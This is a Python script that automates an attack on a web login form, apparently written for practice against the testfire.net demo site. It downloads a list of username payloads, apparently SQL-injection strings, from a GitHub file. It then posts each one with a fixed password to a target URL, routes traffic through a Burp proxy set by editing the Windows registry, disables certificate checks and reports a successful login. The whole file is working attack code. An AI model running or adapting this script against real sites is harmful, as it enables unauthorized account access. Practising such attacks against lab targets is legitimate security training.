import requests
import urllib3
import keyboard
import subprocess
from time import sleep

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
BURP_PROXY = "http://127.0.0.1:8080"

def set_system_proxy():
    subprocess.call('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings" /v ProxyEnable /t REG_DWORD /d 1 /f', shell=True)
    subprocess.call(f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings" /v ProxyServer /t REG_SZ /d 127.0.0.1:8080 /f', shell=True)

def reset_system_proxy():
    subprocess.call('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings" /v ProxyEnable /t REG_DWORD /d 0 /f', shell=True)

def main():
    TARGET_URL = input("Enter the target login POST URL: ").strip()
    fixed_password = input("Enter the password to try for all usernames: ").strip()

    headers = {
        'User-Agent': 'Mozilla/5.0',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Referer': 'http://testfire.net/login.jsp'
    }

    PAYLOAD_URL = "https://github.com/cse835/text/blob/main/payloads.txt"
    try:
        print("[*] Fetching usernames from GitHub...")
        response = requests.get(PAYLOAD_URL, verify=False)
        response.raise_for_status()
        raw_lines = response.text.strip().splitlines()
    except Exception as e:
        print(f"[!] Failed to fetch payloads: {e}")
        return

    usernames = []
    for line in raw_lines:
        clean = line.strip().replace('\ufeff', '')
        if (clean.startswith("'") and clean.endswith("'")) or (clean.startswith('"') and clean.endswith('"')):
            clean = clean[1:-1]
        usernames.append(clean)

    set_system_proxy()

    login_success = False
    for uname in usernames:
        data = {
            'uid': uname,
            'passw': fixed_password,
            'btnSubmit': 'Login'
        }

        print(f"[*] Trying: USERNAME = {repr(uname)} | PASSWORD = {fixed_password}")

        try:
            response = requests.post(
                TARGET_URL,
                data=data,
                headers=headers,
                proxies={'http': BURP_PROXY, 'https': BURP_PROXY},
                verify=False,
                allow_redirects=False
            )

            if response.status_code == 302 and 'main.jsp' in response.headers.get('Location', ''):
                print("✓ successfully completed.")
                login_success = True
                break

        except Exception as e:
            print(f"[!] Error: {e}")

        sleep(0.5)

    if login_success:
        print("[*] Press Ctrl + K to exit and restore original proxy settings.")
        try:
            while True:
                if keyboard.is_pressed('ctrl') and keyboard.is_pressed('k'):
                    print("[*] Ctrl + K detected. Exiting...")
                    break
                sleep(0.2)
        except KeyboardInterrupt:
            pass

    reset_system_proxy()
